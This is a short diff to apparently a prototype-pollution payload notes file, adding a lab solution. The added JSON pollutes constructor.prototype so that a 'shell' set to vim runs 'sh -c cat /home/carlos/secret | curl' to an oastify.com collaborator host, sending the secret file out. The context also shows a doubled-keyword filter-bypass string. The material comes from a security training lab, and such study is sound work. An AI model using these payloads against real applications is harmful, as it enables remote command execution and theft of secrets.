@@ -706,4 +706,17 @@ consconstructortructor.proprototypetotype
 "shell":"vim",
 "input":":! <command>\n"
 ```
+
+- Lab(Solved by using 'vim ":!sh -c ''")-:
+
+```json
+{
+  "constructor": {
+    "prototype": {
+      "shell": "vim",
+      "input": ":! sh -c cat /home/carlos/secret | curl z993grzca1i7deezwsccp9qvcmid6gu5.oastify.com/ -d @- \n"
+    }
+  }
+}
+```
 ----------------
